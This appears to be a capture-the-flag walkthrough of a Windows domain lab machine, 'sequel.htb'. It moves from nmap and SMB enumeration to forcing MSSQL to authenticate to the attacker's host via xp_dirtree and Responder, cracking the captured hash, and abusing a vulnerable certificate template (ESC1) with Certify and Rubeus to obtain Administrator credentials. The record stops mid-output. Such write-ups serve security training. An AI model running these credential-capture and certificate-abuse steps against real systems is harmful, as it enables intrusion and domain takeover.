# Reconnaissance
- 
## Nmap Enumeration
- We pass the commands:
	```bash
nmap -sV -sC -vv 10.10.11.202
nmap -sU --top-ports=10 -vv 10.10.11.202
---OUTPUT-TCP---
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 (generic dns response: SERVFAIL)
| fingerprint-strings: 
|   DNS-SD-TCP: 
|     _services
|     _dns-sd
|     _udp
|_    local
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-09 20:44:13Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Issuer: commonName=sequel-DC-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-01-18T23:03:57
| Not valid after:  2074-01-05T23:03:57
| MD5:   ee4c:c647:ebb2:c23e:f472:1d70:2880:9d82
| SHA-1: d88d:12ae:8a50:fcf1:2242:909e:3dd7:5cff:92d1:a480
| -----BEGIN CERTIFICATE-----
| MIIFkTCCBHmgAwIBAgITHgAAAAsyZYRdLEkTIgAAAAAACzANBgkqhkiG9w0BAQsF
        <SNIP>
| 8NoXXuh0ioTHmCqYrdtIcB8KC4nS70p3ef2F2fTNejqtw46M04VZQw/67Y+83hI5
| I1fLChrYFtPk3g5JHaHyIE9aY3EUmU3EH2SKhRSi5R6GJBctmw==
|_-----END CERTIFICATE-----
|_ssl-date: 2025-04-09T20:45:33+00:00; +8h00m00s from scanner time.
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-09T20:45:33+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Issuer: commonName=sequel-DC-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-01-18T23:03:57
| Not valid after:  2074-01-05T23:03:57
| MD5:   ee4c:c647:ebb2:c23e:f472:1d70:2880:9d82
| SHA-1: d88d:12ae:8a50:fcf1:2242:909e:3dd7:5cff:92d1:a480
| -----BEGIN CERTIFICATE-----
| MIIFkTCCBHmgAwIBAgITHgAAAAsyZYRdLEkTIgAAAAAACzANBgkqhkiG9w0BAQsF
		| <SNIP>
| 8NoXXuh0ioTHmCqYrdtIcB8KC4nS70p3ef2F2fTNejqtw46M04VZQw/67Y+83hI5
| I1fLChrYFtPk3g5JHaHyIE9aY3EUmU3EH2SKhRSi5R6GJBctmw==
|_-----END CERTIFICATE-----
1433/tcp open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.10.11.202:1433: 
|     Target_Name: sequel
|     NetBIOS_Domain_Name: sequel
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: dc.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
|_ssl-date: 2025-04-09T20:45:33+00:00; +8h00m00s from scanner time.
| ms-sql-info: 
|   10.10.11.202:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-09T20:42:55
| Not valid after:  2055-04-09T20:42:55
| MD5:   62ca:0721:efba:fde7:0312:d68b:5f0a:968a
| SHA-1: 1a8a:cb77:5900:2a0b:174d:924e:66fb:96b9:bbe1:65fe
| -----BEGIN CERTIFICATE-----
| MIIDADCCAeigAwIBAgIQZ46Uhhoe3rhO/qMMlsDuKzANBgkqhkiG9w0BAQsFADA7
		<SNIP>
| dFONZq6JcXtyIgb2rK2aODTXaEFaKUM3eYkNC1ako/QM9T66tTfxrrqvYn39uGWI
| rWdRkw==
|_-----END CERTIFICATE-----
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-09T20:45:33+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Issuer: commonName=sequel-DC-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-01-18T23:03:57
| Not valid after:  2074-01-05T23:03:57
| MD5:   ee4c:c647:ebb2:c23e:f472:1d70:2880:9d82
| SHA-1: d88d:12ae:8a50:fcf1:2242:909e:3dd7:5cff:92d1:a480
| -----BEGIN CERTIFICATE-----
| MIIFkTCCBHmgAwIBAgITHgAAAAsyZYRdLEkTIgAAAAAACzANBgkqhkiG9w0BAQsF
		<SNIP>
| 8NoXXuh0ioTHmCqYrdtIcB8KC4nS70p3ef2F2fTNejqtw46M04VZQw/67Y+83hI5
| I1fLChrYFtPk3g5JHaHyIE9aY3EUmU3EH2SKhRSi5R6GJBctmw==
|_-----END CERTIFICATE-----
3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-09T20:45:33+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Issuer: commonName=sequel-DC-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-01-18T23:03:57
| Not valid after:  2074-01-05T23:03:57
| MD5:   ee4c:c647:ebb2:c23e:f472:1d70:2880:9d82
| SHA-1: d88d:12ae:8a50:fcf1:2242:909e:3dd7:5cff:92d1:a480
| -----BEGIN CERTIFICATE-----
| MIIFkTCCBHmgAwIBAgITHgAAAAsyZYRdLEkTIgAAAAAACzANBgkqhkiG9w0BAQsF
		<SNIP>
| I1fLChrYFtPk3g5JHaHyIE9aY3EUmU3EH2SKhRSi5R6GJBctmw==
|_-----END CERTIFICATE-----
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.95%I=7%D=4/9%Time=67F66BAB%P=x86_64-pc-linux-gnu%r(DNS-S
SF:D-TCP,30,"\0\.\0\0\x80\x82\0\x01\0\0\0\0\0\0\t_services\x07_dns-sd\x04_
SF:udp\x05local\0\0\x0c\0\x01");
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 63970/tcp): CLEAN (Timeout)
|   Check 2 (port 62013/tcp): CLEAN (Timeout)
|   Check 3 (port 50586/udp): CLEAN (Timeout)
|   Check 4 (port 32529/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s
| smb2-time: 
|   date: 2025-04-09T20:44:54
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

---OUTPUT-UDP---
53/udp   open          domain       udp-response ttl 127
123/udp  open          ntp          udp-response ttl 127
```
	- SMB
	- LDAP
	- MSSQL (Windows)
	- Date is 8 hours ahead so any kerberos related required ntp date
	- Active Directory
- No directory enumeration as no website
- **NOTE: Can see certificate at sequel.htbb:3269. The common name is possible the domain name and dc domain name**. 
	- Can also pass:
		```bash
openssl s_client -showcerts -connect 10.10.11.202:3269
openssl s_client -showcerts -connect 10.10.11.202:3269 | openssl x509 -noout -text | less -S
```
## SMB Enumeration
- We pass the command :
	```bash
smbclient -U '' -L //10.10.11.174
smbclient //10.10.11.174/Public -N
> ls
> get "SQL Server Procedures.pdf"
---OUTPUT---
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share 
Public          Disk      
SYSVOL          Disk      Logon server share 

---OUTPUT-2---
SQL Server Procedures.pdf           A    49551  Fri Nov 18 08:39:43 2022
```
- Can also pass :
	```bash
crackmapexec smb 10.10.11.202 -u '' -p '' --shares
```
	- On reading this file it talks about a few key things:
		- Guest SQL Credentials : PublicUser : GuestUserCantWrite1
		- SQL Management Studio (version 16?)
			- There is an RCE vulnerability
				- CVE-2022-29143
		- Ryan, Tom (maybe admin?)
		- joining sql from domain and non domain machine
		- can test with smb
## Initial Foothold (MSSQL and System)
- we connect to sql with guest credentials:
	```bash
impacket-mssqlclient PublicUser:GuestUserCantWrite1@dc.sequel.htb
> help
```
	- We see some commands we can use (some we are denied permissions).
		- We start responder on our interface and pass a working command with our local ip and a fake share
			```bash
---ON-LOCAL-MACHINE---
sudo responder -i tun0

---ON-ATTACKER-MACHINE-SQL---
xp_dirtree //10.10.14.25/teset/folder # only works with xp_dirtree

---OUTPUT-RESPONDER---
sql_svc::sequel:fceea46898e38734:A0B396EFB00C580AC696687476B8E79A:0101000000000000002D87A939A9DB01EAE711801F3A1E9B0000000002000800540041003200360001001E00570049004E002D004300580050004200450032003600420033005300420004003400570049004E002D00430058005000420045003200360042003300530042002E0054004100320036002E004C004F00430041004C000300140054004100320036002E004C004F00430041004C000500140054004100320036002E004C004F00430041004C0007000800002D87A939A9DB010600040002000000080030003000000000000000000000000030000050A166CB8F8ED0D4CCAF726A2D7D7D5BBD25AA4F88651AB163D4F69E37D6FAB70A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320035000000000000000000
```
			- Why xp_dirtree ?
				-  it specifically triggers a UNC path access, which causes SQL Server to authenticate to your attacker machine.
- We crack the hash
	```bash
vi sql_svc.hash # copy output above
john sql_svc.hash --wordlist=/user/share/wordlists/rockyou.txt

---OUTPUT---
REGGIE1234ronnie (sql_svc)
```
	- Could test if we can execute commands with crackmapexec -x flag
		```bash
crackmapexec smb 10.10.11.202 -u 'sql_svc' -p 'REGGIE1234ronnie' --shares -x "ping 10.10.14.25"

---ON-LOCAL-MACHINE---
sudo tcpdump -i tun0 icmp -n
```
		- Doesn't work
- Winrim into it:
	```bash
evil-winrm -u sql_svc -p REGGIE1234ronnie -i sequel.htb
```
	- Looking around se find SQLServer in C:\
	- I downloaded everything but we can move to logs and read logs directly
		```bash
cd C:\SQLServer

download *
OR
cd Logs
type ERRORLOG.BAK
---OUTPUT---
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
```
		- Looks like user entered their password in user field by mistake
- We login as Ryan.Cooper using evil-winrm
	```bash
evil-winrm -u Ryan.Cooper -p NuclearMosquito3 -i 10.10.11.202
```
## Privilege Escalation
### Method 1a (Certify + Rubeus)
- In our Nmap scan there were a lot of certiicate outputs.
	- So let's check if there's a vulnerability there.
	- We use certify from :
		- https://github.com/Flangvik/SharpCollection
		```bash
sudo cp /opt/SharpCollection/NetFramework_4.7_Any/Certify.exe .

---ON-TARGET-MACHINE---
cd \programdata
upload Certify.exe
./Certify.exe find /vulnerable

---OUTPUT---
[!] Vulnerable Certificates Templates :

    CA Name                               : dc.sequel.htb\sequel-DC-CA
    Template Name                         : UserAuthentication
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
      Object Control Permissions
        Owner                       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
        WriteOwner Principals       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteDacl Principals        : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteProperty Principals    : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519

```
	- User Authentication is vulnerable
		- Probably due to sequel\Domain Users group rights
			- We can check Ryan.Cooper's group
				```bash
net user
net user ryan.cooper

---OUTPUT---
Global Group memberships     *Domain Users
```
				- We also see user Administrator
	- `In particular we can see that Authenticated Users can enroll for this template and since the msPKI-Certificate-Name-Flag is present and contains ENROLLEE_SUPPLIES_OBJECT the template is vulnerable to the ESC1 scenario. Essentially, this allows anyone to enroll in this template and specify an arbitrary Subject Alternative Name. Meaning that, we could authenticate as a Domain Administrator by exploiting this attack path.`
- In the certify github page it talks of 3 scenario's, with the third one being our case.
	- We exploit this command with our creds:
		- Basically requesting ticket for our user but saying we are admin
		```bash
.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator

---CERTIFICATE-OUTPUT---

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAoCgq5YXRQcJ6BjlrqRjnsW56NDO7glPGy+Fa6g/grWYp2Dbg
oEZWYhO04E8PhjHF1arEK0a5ntFD/ZUYr6j2OU++cI9g/k/3zBg+ADZEX1sJtxXp
P6RDFv2tQX6hPrg19NBKnXi/rPHP3hUnckFYrFA0+dko+K2LMnFytCquq3UP7peZ
ne4fMaEW2NPutJ0FKkaJdhFhS6l7F1ly9bFq1mO+xoberH+7SZAhcd6TK9SoUAMv
y5TV10IXl6WYS73CcbczNyWbm5pWd8lyrBYi3ppzR3y9p5KnrffY6HEqSYy7Fp5r
oHlXVJdoh6lLF7ll1sz/cK4/ga0A5FPRT7hP9QIDAQABAoIBAQCTwntRJxTYxsQt
2ewqJoAcgwDcCJ6GryRKFa/7Ior3b7pLcNXtCPfJpMTL7iU0edc8OkCibK30iL1h
x5zu88O3PItG7gFeoAjOk88gAvExyJw9/kkkHjiHjaO7OUkqxGmDZGhywGSW+sH8
8ydhkkhtMdKucFwMkpBKCcD52Ccup2wfH9Fh/3Lq1HyQWbvUBWeLZEUEfqMY0aVn
SxtlQLohbgjqMdcmKX8RpTOO0LLIdv7xmBUnGu8pBkVT9LIMkZ8cwy+sbJ4xl6oz
5wQnZjVXEK77F2Rlp1OtTuGMDXLtis52jQ+xF1cxssOx77jgRuLlqvdwaDav5qc5
P6k3EJhBAoGBANHB25vECLu/1ndiUfZ3CfklZwnJr1J+Fwc06bQjU5V2H5VV0VOx
5dkQk55xYXxAjxnnaKBSnGUu2OexBeHm5OG+8bCCxXbR9Okg+DKShx4PDDKj/00e
oQge1Bl7I8MokSPzNzFTa/WUDK00AytJJIseNipcXX3MAAKqjvUpxEi7AoGBAMN2
/2S+qPDqaPlnpTZNa8ZgRpn8+0KG5XHzKrRAmbiCK7sNa6E7fve3tw2nhjpgoOjx
wM56DdH8y5/WHrRsjeedbD2bzPYe14G/nD3NpJMmYF1yfCeWpV+Fx8IFy64CTgze
mHNHzmnpJTrvLAGGo76N/O7XWTHKJTTTpsWPudcPAoGAIw5cLp9HumEobdFv01o3
v30ByH/9njLWlGzCdknFKWCRjLrH/k3oFSwRD9TxLvv3LqQfN1Q3MS3wMGDEk+mr
7RKlgBOK/v2+CcxpzsHwdRScvEXuYCwzS5Ejb5LF+lLoVvLKEaNYkrWInNXpha12
vw1wjgnb0i9q/QcWV2EAngsCgYEAwc56mpSlBAMYxLosyPPo+dA6ELMTGrqQQ/Tc
kc8/2/9NhvFel4ZbdRk2qpZBdB6dTXtvNgs1KtFhwQDYfwLnjRC84zVY+2xHOEIZ
k/oTxUeW4vECA2rOXDFUiJ+gfc+RPhdzx1Iaa08deBrvYi/yqZ01fkgOC10omQGG
6XqBxKcCgYAKohnbgRfr6YXLTw6fm9M0IvjBxa8+gbEittxrIzNuO+KA15m9Xs/Q
kXsC/OhTz3hLpBlyp1bMFT+SUw8FZ8QAZkTGhx9wsHGvpnKr7LVmkXP8I1dEBI4j
k4Iu6J9oLsqYdOet1c+BELC/qlH+lgHAyUA5nQexbRNtpwx4FiHp8A==
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGEjCCBPqgAwIBAgITHgAAAA4Bd6INLQNPmQAAAAAADjANBgkqhkiG9w0BAQsF
ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjUwNDA5MjMyMTI1WhcNMzUwNDA3
MjMyMTI1WjBTMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYG
c2VxdWVsMQ4wDAYDVQQDEwVVc2VyczEUMBIGA1UEAxMLUnlhbi5Db29wZXIwggEi
MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCgKCrlhdFBwnoGOWupGOexbno0
M7uCU8bL4VrqD+CtZinYNuCgRlZiE7TgTw+GMcXVqsQrRrme0UP9lRivqPY5T75w
j2D+T/fMGD4ANkRfWwm3Fek/pEMW/a1BfqE+uDX00EqdeL+s8c/eFSdyQVisUDT5
2Sj4rYsycXK0Kq6rdQ/ul5md7h8xoRbY0+60nQUqRol2EWFLqXsXWXL1sWrWY77G
ht6sf7tJkCFx3pMr1KhQAy/LlNXXQheXpZhLvcJxtzM3JZubmlZ3yXKsFiLemnNH
fL2nkqet99jocSpJjLsWnmugeVdUl2iHqUsXuWXWzP9wrj+BrQDkU9FPuE/1AgMB
AAGjggLsMIIC6DA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3FQiHq/N2hdymVof9
lTWDv8NZg4nKNYF338oIhp7sKQIBZQIBBDApBgNVHSUEIjAgBggrBgEFBQcDAgYI
KwYBBQUHAwQGCisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcV
CgQoMCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkq
hkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYF
Kw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFK47ZCq9ZlKQnkheLzSz/pFLb82p
MCgGA1UdEQQhMB+gHQYKKwYBBAGCNxQCA6APDA1BZG1pbmlzdHJhdG9yMB8GA1Ud
IwQYMBaAFGKfMqOg8Dgg1GDAzW3F+lEwXsMVMIHEBgNVHR8EgbwwgbkwgbaggbOg
gbCGga1sZGFwOi8vL0NOPXNlcXVlbC1EQy1DQSxDTj1kYyxDTj1DRFAsQ049UHVi
bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
bixEQz1zZXF1ZWwsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFz
ZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEE
gbAwga0wgaoGCCsGAQUFBzAChoGdbGRhcDovLy9DTj1zZXF1ZWwtREMtQ0EsQ049
QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv
bmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/
b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsF
AAOCAQEApQ67PYwsOjLSvQDu855oWfINPwG6b7EA/Stl4w8+I/QyJxegnukBqchr
WT5fq52EAAPYjJb5muJ0s1mxXTTEINKfS1f9iPX2A2ghHo2RpXUcRGp/8SKjVp4o
I/ZHmDpwAFVfFfeDRIAeQrWEvMopKPfyjA9FkPP4KRj0c2EHk7vySlKCXFP2qJ1d
2VRf2xoTR/S78UV/748qqUnwTIjy66b9y9vGW7F7G2QCz33QTHkOIzk/iA5HJNd/
yZ7NhnxFBkePMywYrw/roDcFPsBBGtB1HS3Ehv9OVHg74CRtnNd/U/t8x1H6CVPO
BGXKBgeNyoyxoMhhVQtX51opOsf//g==
-----END CERTIFICATE-----

[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```
	- to check file command on the pfx file should be data
	- We also save the certificate and key to seperate files 
		- key.cert
		- key.pem
	- Then we try to login with winrm and these certs:
		```bash
evil-winrm -S -c key.cert -k key.pem 0i sequel.htb
```
		- Doesn't work. We can check port 5986 (used for ssl certificate)
			- maybe we use psexec? (didn't try)
			```bash
nc -zv 10.10.11.202 5986 # no response
netstat -an | findstr 5986 # no response
```
			- Not listening on 5986 so cannot winrm over ssl
- We upload Rubeus to target to do it locally (via evil-winrm):
	```bash
upload www/Rubeus.exe
upload cert.pfx
```
- Ask for TGT from DC:
```bash
.\Rubeus.exe asktgt /user:Administrator /certificate:C:\programdata\cert.pfx


---OUTPUT---
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3

[*] Action: Ask TGT

[*] Got domain: sequel.htb
[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\Administrator'
[*] Using domain controller: fe80::90a9:a975:4ccc:da9d%4:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
```
- Get NTLM Hash:
	```bash
.\Rubeus.exe asktgt /user:Administrator /certificate:C:\programdata\cert.pfx /getcredentials /show /nowrap



---OUTPUT---
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3

[*] Action: Ask TGT

[*] Got domain: sequel.htb
[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\Administrator'
[*] Using domain controller: fe80::90a9:a975:4ccc:da9d%4:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

